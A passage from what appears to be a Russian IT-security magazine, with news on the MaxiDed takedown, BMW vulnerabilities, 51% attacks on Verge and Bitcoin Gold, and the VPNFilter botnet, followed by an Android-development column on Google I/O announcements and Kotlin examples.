  с банковскими картами и так далее. Голландская полиция, в свою оче редь,
  сообщает, что под эгидой MaxiDed работал файлооб менник DepFile, который
  широко использовался для размещения дет ской порнографии. Правоох‐
  ранители утвер ждают, что сотрудники MaxiDed знали о противозаконной
  деятельности и детском порно, процветавших на их серверах, но ничего
  не предпринимали.
    Нидерландские влас ти арес товали десять серверов MaxiDed, размещав‐
  шихся на территории стра ны. Одновременно с этим их кол леги из полиции
  Таиланда задержали на мес тном курорте 29‐летнего гражданина Молдовы,
   чье имя не разглашается. По данным пра воохранительных органов, он
  не только один из владельцев MaxiDed, но и имеет отношение к упомянутому
  файлообменному сервису. Полиция Болгарии, в свою очередь, задер‐
  жала 37‐летнего гражданина Молдовы, который, вероятно, был одним
  из администраторов MaxiDed.
     Теперь официальный сайт MaxiDed переадресует своих посетителей
  на классическую «заглушку», гласящую, что ресурс перешел под контроль
   голландской полиции и в нас тоящее время ведется расследование. Правоох‐
  ранители сообщают, что все изъ ятые у MaxiDed данные уже переданы в рас‐
  поряжение представителей Евро пола, которые помогут рас пространить эту
  информацию среди пра воохранительных орга нов других стран, чья помощь
  понадобится для дальнейшего расследования.


  200 ПРИЛОЖЕНИЙ БЛОКИРОВАНЫ FACEBOOK ИЗ‐ЗА
 ЗЛОУПОТРЕБЛЕНИЯ ДАННЫМИ

   Компания Facebook продолжает разбираться с пос ледствиями скандала, связанного с ком‐
   панией Cambridge Analytica. Представители Facebook тщательно изу чают приложе ния, работа‐
  ющие с социальной сетью. В настоящее время над этим трудится большая команда собствен‐
   ных экспертов компании и специалис тов, привлечен ных со стороны.


   Пока процесс далек от завер шения, но уже были изучены тысячи приложений, имев ших доступ
   к пользовательским данным до 2014 года. Около 200 из них вызвали подозрения у спе циалис‐
   тов. Их названия пока не раскрываются, ведь аналитикам еще предстоит более детально изу‐
   чить их и вынести окончательный вердикт о злоупотреблении данными. Тем не менее все
   подозрительные приложения уже были блокированы до окон чания разбирательств.





 КУЧА БАГОВ В BMW
  Эксперты Keen Security Lab, исследова тельского подразде ления компании
   Tencent, на протяжении года изу чали бортовые сис темы автомобилей BMW.
  В итоге в марте 2018 года специалисты уведомили инженеров BMW об обна‐
  ружении 14 уязвимостей, поз воляющих скомпро мети ровать транспортные
  средства как локально, так и уда ленно.
    Семи проблемам уже были присвоены идентификаторы CVE (CVE‐2018‐
   9322, CVE‐2018‐9320, CVE‐2018‐9312, CVE‐2018‐9313, CVE‐2018‐9314, CVE‐
  2018‐9311 и CVE‐2018‐9318), оставшиеся баги пока ждут своей очереди. Уяз‐
  вимостям подвержены авто начиная с 2012 года выпуска, в том числе: BMW i
   Series, BMW X Series, BMW 3 Series, BMW 5 Series, а также BMW 7 Series.


                                        Продолжение статьи →
← Начало статьи





  Пока специалисты обна родовали лишь предварительный отчет о своих
  находках, тогда как его полная версия ожидается только в начале 2019 года.
  Таким образом иссле дова тели дают раз работчикам BMW и владельцам
  проблемных автомобилей больше времени на устранение уяз вимостей.
    В своих изысканиях специалисты сос редоточились на трех основных ком‐
  понентах авто: информационно‐раз влекательных системах (они же Head
   Unit), блоках кон троля телематики (TCU/T‐Box), а также центральных модулях
  шлюза (Central Gateway Module). В ито ге были найдены сле дующие баги:
   • восемь уязвимостей затрагивают подключенные к интернету информа‐
     ционно‐развле кательные системы;
   • четыре уязвимости каса ются работы TCU и ряда функций, за которые он
     отвечает: телефонных сервисов, сервисов помощи в случае аварии, а так‐
     же удаленной блокировки/раз блокировки дверей;
   • две уязвимости обна ружены в Central Gateway Module, который приз ван
     получать диагностичес кие сооб щения от TCU и информационно‐развле‐
     кательных систем, а затем «переводить» их для Electronic Control Units
     (ECU) на других CAN‐шинах.

  Исследователи пишут, что раз личные комбинации этих проблем позволяют
  взломать автомобиль локально, имея к нему физичес кий доступ (пос редс‐
  твом USB‐накопителя и доступа к порту ODB), или удаленно (вооружившись
  программно определяемой радиосистемой, SDR).
     К радости владельцев уяз вимых авто, одна из самых опасных удаленных
   атак весьма сложна в исполнении, в час тности она потребует компрометации
  местной GSM‐сети. Исследова тели и разработчики BMW сходятся во мне‐
   нии, что большинству зло умышленников такая задача будет не по пле чу.
  С другой стороны, удаленно можно эксплуатировать сразу шесть из обна‐
  руженных багов, один из которых, например, подразуме вает компрометацию
  через Bluetooth.
     Представите ли BMW сооб щили, что готовят исправления для найденных
  специалистами проб лем. Шесть «заплаток» уже раз дают удаленно, «по воз‐
   духу»,  но  другие  патчи  потребуют  изменения  настроек  компонентов
  и модификаций прошивок, то есть задача доставить их конечным пользовате‐
  лям будет возложена на дилеров. Ожидается, что обновле ние будет окон‐
   чательно завершено в начале 2019 года.


 ОБНАРУЖЕНЫ 5000 РОУТЕРОВ БЕЗ ПАРОЛЯ ДЛЯ TELNET
   Специалист компании NewSky Security и известный эксперт в области IoT‐безопасности Анкит
   Анубхав (Ankit Anubhav) обнаружил, что бразильский провайдер Oi Internet предоставляет сво‐
   им клиентам роутеры, не оснащенные паролем для Telnet.


   После заключения договора пользователи получают устройства Datacom DM991CR, DM706CR
   и DM991CS, и примерно к 5000 из них можно спокойно под ключиться посредством Telnet.
   Исследователь заглянул в инструкции проблемных устройств и обнаружил, что они пос тавля‐
   ются без Telnet‐паролей по умол чанию, то есть сконфигурировать их должен сам пользователь.


   К сожалению, попытки связаться с инженерами Oi Internet не увенчались успехом. В итоге
   Анубхав был вынужден обратиться за помощью в бразиль ский CERT, наде ясь, что мес тная
   организация сумеет уведомить провайдера и его клиентов об опасности.





 VERGE И BITCOIN
 ПОД АТАКОЙ
  Эксперты сообщают, что прес тупники вновь атаковали криптовалюту Verge
   (XVG), обойдя предыдущие патчи и хардфорк. Также была зафиксирована
   атака на инфраструктуру Bitcoin Gold (BTG), при несшая злоумышленни кам
  более 18 миллионов долларов.


  Verge
  В конце мая операторы пула Suprnova сообщили, что криптовалюта Verge
   (XVG) вновь подверглась ата ке зло умышленни ков, длившейся несколько
   часов. 22 мая 2018 года аналогичные сооб щения появились также на Reddit
  и форумах Bitcointalk.





  По подсчетам пользователей, изучивших атаку, всего за нес колько часов зло‐
  умышленники успе ли добыть около 35 миллионов XVG, что на тот момент
  было эквивален тно примерно 1,6 миллиона долларов США (позже валюта
  потеряла около 15% сто имос ти).
     Судя по всему, новая ата ка повторила апрельский сценарий. Напомню,
   что пол тора месяца назад Verge уже оказалась под прицелом злоумышленни‐
   ков, устроивших так называемую «ата ку 51%». Под данным термином под‐
  разумевается, что в распоряжении атакующих находится мощность, «переве‐
  шивающая» всю осталь ную сеть, своего рода «контрольный пакет». В апреле
  преступники «накопали» порядка 15,6 миллиона XVG, то есть пример‐
  но 780 тысяч долларов США.
     Тогда разработчики XVG выпус тили экс тренный патч и в конечном итоге
  были вынуждены прибегнуть к хардфорку, что должно было окончательно
   устранить баги, которыми пользовались злоумышленни ки.
    Сейчас, после новой атаки, пользователи и специалисты полагают, что
  преступники нашли еще один способ обхода патчей (многие вообще уве‐
  рены, что разработчики не сделали практичес ки ничего для исправления
  проблем) и устроили аналогичную атаку.
     Представите ли Verge, похоже, не согласны с такой точкой зрения. Так,
   в официальном  Twitter разработчиков появилось сообщение о том, что
  на некоторые майнин говые пулы идет DDoS‐ата ка, поэтому случаются задер‐
  жки с подтверждением бло ков. Фактичес ки раз работчики не подтвердили
  и не опровергли информацию об ата ке. Впро чем, сообщается, что ведется
  работа над еще одним патчем.





   Bitcoin Gold
  Не успели пользователи и эксперты разоб раться в происходящем с Verge,
   как под атакой оказалась инфраструктура Bitcoin Gold. Компрометация сети
  BTG началась еще 18 мая 2018 года и тоже отно силась к типу «атака 51%».
     Разработчики сооб щили, что неизвес тный злоумышленник ввел в строй
  множество серверов и захватил контроль более чем над половиной блокчей‐
  на Bitcoin Gold. После это го он получил возможность манипулировать тран‐
  закциями, чем и пользовался на протяжении нескольких дней, проводя так
  называемую «атаку двойной траты» (double spend). Как несложно догадаться
  по названию, данный вектор атак подразумевает, что преступник может нес‐
   колько раз потратить одни и те же средс тва.
     Атакующий исполь зовал «ата ку 51%» и «атаку двойной траты» для обмана
  популярных криптовалютных обменни ков. Так как затраты на такую атаку
  очень велики, у злоумышленника оста вался лишь один вариант: автоматичес‐
   ки  выводить  полученные  «из  воздуха» средства  на  различные биржи
  и обменники, затем быстро обменивать их на другую валюту и, манипулируя
  блокчейном, выводить средства обратно.
    Именно так преступник и поступил — депонировал крупные объемы BTG
   в обменники и одновременно с этим переводил те же средства на свой
  кошелек. Когда операторы или авто матичес кие сис темы обменников замеча‐
   ли, что с блокчейном порабо тали, а транзакции недействительны, было уже
  поздно. Преступник успевал изъять свои средства и удвоить прибыль.
    В качестве контрмеры операторы ресурсов подняли порог, необходимый
  для подтверждения транзакций BTG, одна ко зло умышленник вводил в строй
  все новые и новые вычислительные мощности и все равно продолжал атаку.
     Представите ли Bitcoin Gold пишут, что в нас тоящее вре мя украденные
  хакером средства удалось прос ледить до кошель ка GTNjvCGssb2rbLnD‐
  V1xxsHmunQdvXnY2Ft. Через этот акка унт прош ло более 388 тысяч BTG, что
   эквивалентно более чем 18 миллионам долларов США.
     Хотя преступник похищал средства не у пользовате лей, а обворовы вал
  обменники, на пользователях происходящее все равно может сказаться.
  Из‐за действий злоумышленника некоторые ресурсы попросту рис куют обан‐
  кротиться, могут запретить пользователям выводить BTG, и происходящее,
  конечно, может отразить ся на курсе криптовалю ты.


 МАЙНЕР WINSTARNSSMMINER ЗАРАЗИЛ ПОРЯДКА
  500 000 СИСТЕМ ЗА ТРИ ДНЯ


   Специалисты Qihoo 360 Total Security обнаружили кам панию по распространению майнера Win‐
   starNssmMiner, который только за три дня наблюдений заразил око ло 500 000 машин.

   Вредонос представляет собой обычную майнин говую мал варь, построенную на осно ве опен‐
   сорсного и легитим ного решения XMRig. Но мал варь может преподнести неприятный сюрприз
   пользователю, который ее обнаружит. При попытке избавиться от вре доносного про цесса sv‐
   chost.exe майнер спровоцирует отказ в работе сис темы, вынудив жертву перезагрузить компь‐
   ютер. Дело в том, что вредонос ный процесс получает в сис теме пометку CriticalProcess, поэто‐
   му Windows экстренно завершает работу, если его ликвидировать.

   Группировка, создавшая WinstarNssmMiner, уже заработала 133 Monero, что равняется при‐
   мерно 26 000 долларов США.





 ЭПИДЕМИЯ
 VPNFILTER
  Специалисты Cisco Talos предупредили об обнаружении крупного ботнета,
  получившего название VPNFilter. Сложная мал варь уже заразила как минимум
  полмиллиона роутеров Linksys, MikroTik, NETGEAR и TP‐Link, а также NAS про‐
  изводства QNAP в 54 странах мира. Исследователи подчеркивают, что VPN‐
    Filter — это вторая извес тная IoT‐угроза, способная «пережить» перезагрузку
  зараженного устрой ства (первой недавно ста ла мал варь Hide and Seek),
   к тому же таящая в себе деструктивную функциональность.


  VPNFilter
  Исследователи рассказывают,  что операторы  VPNFilter, судя по всему,
  не использовали для заражения устройств какие‐либо 0day‐уяз вимос ти,
  а эксплуатировали различные известные баги, обнаруженные ранее. Список
  моделей устройств, на которых был обна ружен VPNFilter, опубликованный
  компанией Symantec, можно увидеть ниже.
   • Linksys E1200;
   • Linksys E2500;
   • Linksys WRVS4400N;
   • Mikrotik RouterOS для роутеров Cloud Core: версии 1016, 1036 и 1072;
   • Netgear DGN2200;
   • Netgear R6400;
   • Netgear R7000;
   • Netgear R8000;
   • Netgear WNR1000;
   • Netgear WNR2000;
   • QNAP TS251;
   • QNAP TS439 Pro;
   • другие устройства QNAP NAS, работа ющие под управлением QTS;
   • TP‐Link R600VPN.

  Аналитики Cisco Talos пишут, что VPNFilter — одна из самых комплексных IoT‐
   угроз, с какими им приходилось сталкивать ся. Так, зараже ние делится на три
   стадии. Во вре мя первой ста дии бот VPNFilter прост и легковесен, его
  основная задача на этом этапе — инфицировать устройство и гарантировать
   устойчивое присутствие в системе. Как уже было сказано, ранее умение
  «переживать» перезагрузку IoT‐девайсов демонстри ровала только одна угро‐
  за — ботнет Hide and Seek. Сто ит отметить, что, по данным Symantec, изба‐
   виться от бота первой стадии все же воз можно. Для этого потребу ется сбро‐
   сить устройство к завод ским нас тройкам с пос ледующей перезагрузкой.
     Вторая стадия заражения, по мнению экспертов Cisco Talos, наиболее
  опасна. Хотя сам бот второй ста дии не способен выдержать перезагрузку
  устройства и, казалось бы, более безобиден, на самом деле это не так.
  В вопросах присутствия в системе бот второй стадии полагается на бота пер‐
  вой стадии. Фактически это озна чает, что даже если он будет удален
  с устройства из‐за перезагрузки, то всегда сможет загрузиться повторно.
  Основная роль бота вто рой стадии заключается в подготовке к третьей фазе
  заражения.
    Вместе с этим бот вто рой стадии обладает опасной функциональностью
  самоуничтожения, во время активации которой он перезаписы вает критичес‐
  кие части прошивки устройства и уводит его в перезагрузку. Аналитики пре‐
  дупреждают, что после такого зараженный гаджет превращается в бесполез‐
  ный «кирпич» и не может загрузиться, так как необходимые для загрузки сис‐
  темы части про шивки подменяются случайным «мусором». По мнению спе‐
  циалистов Cisco Talos, после сра батывания функции самоуничтожения боль‐
  шинство пользователей уже не сможет вер нуть свои устройства в строй (пос‐
   кольку не обладают необ ходимыми техничес кими зна ниями).
     Третья фаза атаки подразумевает загрузку на зараженное устрой ство вре‐
  доносных плагинов. В настоящее время ана литики обнаружили три плагина,
  задача которых заключа ется в сниффинге сетевого трафика и перехвате
   пакетов, мониторин ге протоколов Modbus SCADA, а также взаимодействии
  с управляющим сервером через Tor. Вероятнее всего, у операторов VPNFilter
  припасены и другие вредоносные модули, которые пока не были применены.





  Таким образом, операторы VPNFilter способны совершать самые разные
  противоправные действия с помощью своего ботнета. Они могут перех‐
   ватывать трафик и учетные данные от закрытых сетей и систем; могут обна‐
  руживать промышленное SCADA‐обо рудование и заражать его специали‐
  зированной малварью; могут использовать зараженные устройства как обыч‐
  ный ботнет, скрывая за ним различные атаки; и, наконец, могут прос то вывес‐
   ти из строя сотни тысяч устройств.


  Атака на Украину?
  Исследователи подчеркивают, что в пос леднее время VPNFilter очень активно
  заражает устройства на территории Украины (для украинских ботов даже был
  создан отдельный C&C‐сервер). В свя зи с этим специалис ты выражают серь‐
  езное беспокойство из‐за функции самоуничтожения, выводящей пострадав‐
  шие устройства из  строя. Ее активация может  стать тяжелым ударом
  для инфраструктуры стра ны.
     Также нужно сказать, что в Cisco Talos обнаружили сходство VPNFilter
  с мал варью BlackEnergy, которая использовалась в 2015–2016 годах для атак
  на энергетические компании Украины и при вела к мас совым отключениям
   электроэнергии на западе страны.
     Служба безопасности Укра ины выпустила пресс‐релиз, посвященный про‐
  исходящему. Правоох ранители считают, что операторы VPNFilter хотели при‐
  урочить атаку на государс твенные структуры и частные компании к финалу
  Лиги чемпионов, который про шел в Киеве 26 мая 2018 года.
     Нужно отме тить, что некоторые ком пании и специалис ты связывают мал‐
  варь BlackEnergy с группой предположительно рос сийских правительствен‐
  ных хакеров APT28, также извес тной под наз вани ями Fancy Bear, Pawn Storm,
   Strontium, Sofacy, Sednit, Tsar Team, X‐agent, Sednit и дру гими. Теперь с AP‐
  T28 также связывают и VPNFilter, а Служба безопасности Украины открыто
  приписывает авторство малвари РФ. Заметим, что специалисты Cisco Talos
  и Symantec пока никаких выводов не делают, отмечая, что до завершения
  расследования еще далеко.


  Управляющие серверы обез вре жены
  Вскоре после  публикации  отчета‐предупреждения  Cisco  Talos издание
  The Daily Beast сооб щило, что в распоряжении его редакции оказал ся аф‐
  фидевит, согласно которому ФБР решило обез вредить управляющие сер‐
  веры VPNFilter, соч тя угро зу слишком опас ной.
     Судя по документу, западные правоохранители также убеждены, что
  за созданием ботнета сто ит группировка ATP28. Решение суда о блокировке
  управляющих серверов малвари было оперативно получе но после предуп‐
  реждения спе циалистов. В частнос ти, под контроль ФБР перешел домен to‐
   knowall.com, к которому VPNFilter обра щается за получением команд и допол‐
  нительных модулей.
     К сожалению, угроза все равно сохраняется, так как синкхолингом (sink‐
   hole) доменов здесь, вероятно, обойтись не удас тся. Учитывая, что еще на
  первом этапе заражения  VPNFilter сооб щает сво им авторам IP‐адре са
  зараженных  устрой ств,  операторы  ботнета  могут  вос становить  свою
  инфраструктуру в другом мес те и вернуть контроль над инфицированными
   гаджетами.
    В связи с этим поль зователям потенциально уязвимых устрой ств нас‐
   тоятельно рекомендуется произвести сброс к заводским настройкам с пос‐
  ледующей перезагрузкой и убедиться, что исполь зуется новейшая версия
  ПО. Также, если такая возможность есть, малварь можно поис кать в дирек‐
  ториях /var/run/vpnfilterm, /var/run/vpnfilterw, /var/run/torr и /
  var/run/tord. Если они обнаружатся, следует уда лить их содержимое.
HEADER
ANDROID

      GOOGLE I/O И ВСЕ‐ВСЕ‐ВСЕ





                                         Евгений Зобнин
                                           Редактор Unixoid и Mobile
                                                     zobnin@glc.ru





Сегодня в выпуске:  Jetpack для  Android‐разработчиков,
WorkManager для всех фоновых задач, Android App Bundle
вместо тысячи APK, AndroidX, а так же другой треш и угар
с Google I/O, включая потряса ющий рассказ о том, как An‐
droid отрисовывает картинку и оптимизирует код. Ну а для
любителей Kotlin — Kotlin в Android, Kotlin в браузере, Kotlin
в Kotlin, который внутри Java, и два отличных читшита по это‐
му отличному языку.



                    GOOGLE I/O

Jetpack
На конференции Google I/O много говорили о Jetpack — своего рода про‐
качанном наборе инструментов, который сама Google рекомендует исполь‐
зовать   для   создания   быстрых,   про изводительных,   эффективных
и самых‐самых в мире приложений.
  В целом инструменты дос таточно стандартны, это все те же набившие
оскомину AppCompat, новомодный Android KTX (кстати, да, Google намекает,
что Java пора на покой), компоненты так называемой архитектуры Android:
LiveData, ViewModel, Room и так далее. В списке есть и стандартные API An‐
droid, такие, например, как менеджер заг рузок, а еще Emoji, куда же без них.
  Запутав за десять лет эко систему Android до такой степени, что сред‐
нестатистический разработчик уже не может понять, куда ему ткнуться,
Google решила все‐таки внес ти ясность.





                      Компоненты Jetpack


WorkManager
Среди компонентов Jetpack оказался один новый и довольно занятный. Наз‐
вание ему — WorkManager, а история очень и очень интерес ная. Издревле
в Android было два основных метода выполнить фоновую работу: фоновый
поток (AsyncTask, например) и сервисы. Пос ледние пользовались особой
популярностью, потому как работа ли независимо от самого приложения,
да еще и с возможностью попросить систему о своем перезапуске.
   Когда набежала тол па гоблинов, вирусов и говнокоде ров, стало ясно, что
так дело не пойдет и нужен более контролиру емый системой фоновый
механизм. Google придумала JobScheduler, подсистему Android 5, которая
позволяла отдать системе задачу на выполнение в такое‐то и такое‐то вре мя,
почти как в iOS. Сервисы тем временем неистово подавлялись (а в Android
8 вообще ушли в нелегал).
  Со временем JobScheduler обрастал функциональностью, появился его
аналог для более старых ОС (Firebase JobDispatcher), а народ все не унимал‐
ся: ну неудобно нам, убогим, первые версии JobScheduler не работали, дру‐
гие постоянно менялись, предлага емая Google альтернатива зависе ла
от самой инфраструктуры Google; плюс у нас тут RxJava и вообще реактивщи‐
на, а вы нам какой‐то JobScheduler с его идеями из прошлого века.
   Вот  Google  и решила  выкатить  свой  WorkManager  с  промайзами
и обсерве рами. Если говорить в двух словах, то WorkManager — это работа‐
ющая на костях существующего Android биб лиотека, которая поз воляет тебе
делать любые фоновые шту ки с реактивщиной в нужное тебе время, нужной
последовательности и нуж ных усло виях и вооб ще не заботиться о том,
на какой версии все это будет работать (биб лиоте ка выберет нужный
механизм сама, в зависимости от версии Android).


WorkManager.getInstance().beginWith(firstWork)
  .then(secondWork)
  .then(thirdWork)
  .enqueue()


Android App Bundle
Еще один важнейший анонс, сделанный компанией на Google I/O, — это App
Bundle (видео), меч та всех домохозяек, взявших Android Studio в руки. Пред‐
ставь, что у тебя есть приложение, в которое понапихано множес тво самой
разной графики в разных разрешениях, поддержка 150 языков, а еще есть
сборки нативных библиотек для четырех архитектур.
   Чтобы поддерживать все это дело, тебе при ходится писать большой build.‐
gradle, который собирал бы для тебя с десяток различных вариантов APK
для разных платформ, раз решений экра на, воз можно даже языков. Все
это пришлось бы отдельно заливать в Play Store (ну ладно, может быть, ты
юзаешь devops). В любом случае воз ни море, а все ради того, чтобы размер
APK для каждого устройства и региона был адекватным.
  А теперь представь, что ты просто нажимаешь «Собрать приложение»
и вместо множества пакетов Android Studio выда ет тебе один большой файл
формата AAB. И в нем все: все картинки, шрифты, изображения, сборки биб‐
лиотек — все, что только можно. Ты залива ешь этот файл в Google Play, и на
этом твои проблемы заканчиваются: Google Play сам раз берет его на мно‐
жество мелких APK под раз ные архитектуры, раз меры экрана и регионы.
  Более того, в данный момент Google тес тирует функцию Dynamic feature
modules — с ее помощью можно разбивать базовый APK на части, которые
будут докачиваться при необ ходимости. Ну правда, зачем тебе все приложе‐
ние, если большей частью его функций ты даже не будешь пользоваться?





                        Внутренний формат AAB


AndroidX
Ну и в конце, конечно же, об AndroidX. Команда раз работчиков support‐биб‐
лиотек, нужных для реализации новых функций ОС на старых устройствах,
уже, кажется, сама запута лась и решила привес ти в порядок все эти com.an‐
droid.support:appcompat‐v7,  support‐v4 и про чий ворох невнятных, никак
не связанных между собой имен.
   Теперь у нас есть единое прос транство имен для всех библиотек поддер‐
жки: androidx. Все, что относится к API самого Android, теперь в пакете an‐
droid, внешние гугловские библиотеки поддержки — в androidx. Было:


android.support.**
android.databinding.**
android.arch.**
android.arch.persistence.room.**

Стало:


androidx.@
androidx.databinding.@
androidx.room.@



                   ПОСМОТРЕТЬ

Как Android отрисовы вает картинку
Drawn out: how Android renders (Google I/O ’18) — интересное видео с рас ска‐
зом о системе рендеринга Android. Основная цель — донести до зрителя
идею, что малейшие строчки их кода и малейшие изменения интерфейса
приводят в движение огромные механизмы и это следует иметь в виду. Прос‐
тые примеры:
 • простейшее окошко со списком состоит из более чем десятка лейаутов;
 • простая операция смены цвета элемента приводит к его пол ной инвалида‐
   ции, то есть пересчету сос тояния и размеров элемента, а кроме того,
   изменению информации обо всех предках это го элемента;
 • затем эта информация должна быть син хро низи рована с потоком отри‐
   совки, работающим с GPU, плюс ему должны быть отданы битмапы;
 • затем список необ ходимых для отрисовки операций перестраивается
   с целью их оптимизации на GPU (на видео есть превос ходный пример
   на тему отрисовки Gmail в разных вариантах);
 • с помощью GL‐команд выполняется отрисовка нужного изображения,
   которое затем возвращается обратно в тред отрисовки;
 • затем  в дело  всту пает  SurfaceFlinger, который собирает все  части
   интерфейса Android в единое целое.

И это все го лишь то, что происходит при нажатии на элемент списка. В видео
также есть рассказ о происходящем во время промотки этого списка.
Рекомендую посмотреть.





       Иерархия элементов интерфейса прос тейшего приложения


Оптимизация Android P
What’s new in Android Runtime (Google I/O ’18) — еще одно отличное выступле‐
ние на Google I/O, посвященное оптимиза циям в среде исполне ния Android P.
Выступление касается трех пунктов:
 • Kotlin;
 • память;
 • облачные про фили.

С Kotlin все оказалось довольно просто, докладчики рассказали о вынесении
null‐проверок в вызывающие функции, оптимиза циях циклов и некоторых дру‐
гих вещей.
  Две остальные части доклада куда интерес нее. Во‐первых, CompactDex —
специальный компактный формат исполня емого файла Dex (в нем хранится
код приложений для Android). В Android P формат CompactDex используется
для хранения извлеченного из APK кода приложения, а также для хранения
кода приложения в оперативной памяти.
  В среднем CompactDex позволил сократить раз мер хранящегося в памяти
устройства кода приложения на 11,6%. Это касается и пос тоянной памяти,
и оперативной, но не каса ется самих приложений, распространяющихся
через маркеты.
   Также в Android P был усовершенс твован JIT‐компилятор, а точнее его
часть, ответственная за оптимиза цию расположения данных в опе ративной
памяти, когда наибо лее час то используемые и нужные при загрузке при ложе‐
ния методы размещаются ближе к началу оперативной памяти процесса. На‐
помню, что начиная с седь мой версии Android исполь зует гибридный JIT/AOT‐
компилятор, который сна чала выполняет приложения, используя виртуальную
машину, а лишь затем переводит приложение в машинные инструкции.





        Как происходит обработка установленно го APK в Android O
                            и Android P

Ну и наконец, облачные профили. Это более простая, но эффективная идея.
Во время исполнения любого приложения Android строит профиль его
исполнения. В будущем такой профиль поз воляет среде исполне ния «подс‐
троиться» под приложение и запус тить его быстрее.
  Идея функции Cloud Proﬁles в том, чтобы собрать данные профайлинга
с разных устройств, агрегиро вать их и прикрепить к приложению в Google Play
в виде единого файла профайлинга. Когда поль зователь скачает приложе‐
ние, он также получит файл профайлин га, и система сможет использовать его
для ускорения запуска приложения. В дальнейшем профиль будет пополнен
и расширен самим устройством.
  На собственных приложениях Google система облачного профайлинга
дала выигрыш в скорости первичного запус ка при мерно в 20%.





                    Как работают облачные про фили

В ходе тестирования сис темы авторы сделали интересные выводы: в сред‐
нем в данные профайлинга попали только 14% кода приложения, а это зна‐
чит, что остальные 86%, ско рее всего, вообще не используются. Но это
не обязательно мертвый код, это могут быть функции, отключенные на разных
версиях Android, или, например, код отладки, отклю ченный в релизной вер‐
сии.


Оче ред ная эко номия батарейки
App Standby Buckets in Android P will help further improve battery life — статья
об еще одном интересном новшес тве Android P под названием App Standby
Buckets.
  Предыстория здесь такова: в Android 6 Google придумала новей шую сис‐
тему массового отстрела приложений, жру щих аккумулятор. Сос тояла она
из двух частей: Doze и App Standby. Во время прос тоя смартфона (примерно
час) в силу вступал Doze, он отключал фоновую активность, запрещал доступ
в интернет, снимал вейкло ки (они нуж ны, чтобы удерживать смартфон
в режиме бодрствования), откладывал алармы, если они были не особо сроч‐
ными.
  В то же время работала система App Standby. Она занималась практичес‐
ки той же работой, но в отно шении отдельно взятых приложе ний: дескать, раз
уж юзер тобой не поль зуется, а ты висишь и что‐то там качаешь из интерне‐
та — лети в бан.
  Насколько эффективной была эта система, никто так и не выяснил, но в
Android P Google таки умудрилась ее рас ширить. Теперь речь идет не прос то
о классификации «работает / не работает», а о целой системе приори тетов.
Все приложения теперь раз деляются на группы:
 • активные: приложение используется сейчас;
 • регулярные: приложения используются регулярно;
 • частые: приложения используются часто, но не каждый день;
 • редкие: приложения используются реже одного‐нескольких дней.

В зависимости от частоты использования Android будет выделять приложе‐
ниям различные ресурсы. Такая вот дискри мина ция.



                       ДРУГОЕ

Kotlin в браузе ре
Embedding Kotlin Playground — с виду простой блог‐пост, рассказывающий,
как встроить среду исполнения Koltin в собственную страницу, где бы она
ни хостилась. Сам код находится здесь.
  Отмечу также, что  у  Kotlin есть пол ноценная веб‐среда разработки,
с помощью которой можно не только учиться программировать, но и писать
полезный код.


Скриптовый Kotlin внутри Kotlin, который в Java
Run Kotlin Scripts (kts) from regular Kotlin Programs. Факт номер 1: приложения
Kotlin могут быть выполнены в режиме скриптинга (переиме новы ваем файл
в  .kts и скармливаем его kotlinc). Факт номер  2: Java поддерживает
интеграцию со скриптовыми языками (JSR‐223). Факт номер 3: по умол чанию
Kotlin компилируется в JVM (Java) и наследу ет почти все ее свой ства.
   Ну а суть статьи в том, как все это заставить работать вместе и сделать
на  Kotlin  приложение,  функциональность  которого  можно  рас ширять
с помощью скриптов на Kotlin. Выглядеть вызов скриптов Kotlin из Kotlin
может так:


with(ScriptEngineManager().getEngineByExtension("kts")) {
    eval("val x = 3")
    val res2 = eval("x + 2")
    assertEquals(5, res2)
}

Код доступен в репозитории KtsRunner.


Kotlin Cheat Sheet
Kotlin Cheat Sheet — простой понят ный читшит о языке Kotlin, который можно
повесить на стенку и начинать каждый день с созерцания красивых строк
кода. Затрагивает: базовый син таксис, управляющие структуры (включая
фирменные «извращения» Kotlin), типы данных и конвертации, лямбды, раз‐
ные  типы  функций,  функции‐рас ширения,  идиоматические  выраже ния.
В целом почти пол ный курс по языку на семи страницах.
    Kotlin Cheat Sheet — и еще один Kotlin Cheat Sheet, более сжатый, скон‐
центрированный на примерах и быстрых решени ях.


Раз вле куха с Anko
Anko Commons Tutorial — у разработчиков Kotlin есть один мало исполь‐
зуемый, очень недооце ненный про ект. Он носит имя Anko и включает в себя
множество подсобных утилит и функций, а в том числе превосходный DSL
(язык в языке), позволяющий с комфортом описывать интерфейс без XML
и ломания мозга (автор статьи с его помощью написал впол не успешное при‐
ложение).
   Эта часть статьи посвящена только час ти Anko Commons, своего рода
сборнику быстрых инструментов для Android‐раз работчиков. Ну и сразу нес‐
колько примеров.
   Как запустить активность со сложным интентом? Так?


val intent = Intent(this, AnimeDetailActivity::class.java)
intent.putExtra("TITLE_KEY", anime.name)
intent.putExtra("DESCRIPTION_KEY", anime.description)
intent.putExtra("IMDB_LINK_KEY", anime.imdbLink)
intent.putExtra("IMAGE_KEY", anime.imageDrawable)
startActivity(intent)

Слишком увесисто, нам нужен Anko:


private fun openDetailActivity(anime: Anime) {
  startActivity<AnimeDetailActivity>(
      "TITLE_KEY" to anime.name,
      "DESCRIPTION_KEY" to anime.description,
      "IMDB_LINK_KEY" to anime.imdbLink,
      "IMAGE_KEY" to anime.imageDrawable
    )
}

Да какое там, если весь интент состоит из имени клас са, то можно вообще
сделать так:


startActivity<AboutActivity>()

А как насчет позвонить?


makeCall(002)

Отправить СМС:


sendSMS(номер, текст)

Ну и наши любимые сообщения:


toast("Я сообщение")

Диалоговое окно?


alert("message", "title").show()

Конечно же, его можно расширить, добавить кнопок и прочее.
   То же самое с селекторами, прогресс‐барами и много чем еще. Вообще,
статья отлично иллюстрирует, как ужать код среднестатис тичес кого приложе‐
ния раза этак в три.


Биб лиоте ки
 • androidexample365.com — огромное количес тво примеров реализации тех
   или иных функций в Android;
 • restring — простая в использовании биб лиотека, поз воляющая хранить
   строки приложения на удаленном сервере и автоматичес ки загружать их
   в приложение;
 • palumu — библиотека, позволяющая сделать элементы интерфейса пла‐
  вающими;
 • PersistantRecyclerAdapter — RecyclerView Adapter, способ ный сохранять
   данные между пересозданиями фрагментов и активнос тей;
 • Cicerone — очередная попытка соз дать роутер, способный упростить
   логическую навигацию между компонентами приложения (основана не на
  фреймворках);
 • Flashbar — очень развитая библиотека для вывода на экран самых раз ных
   типов сообщений, начиная от банальных Toast и Snackbar и заканчивая
   всевозможными окошками со всех сторон экра на;
 • TlsLibrary — Kotlin DSL (язык в языке) для описания TLS‐под ключений;
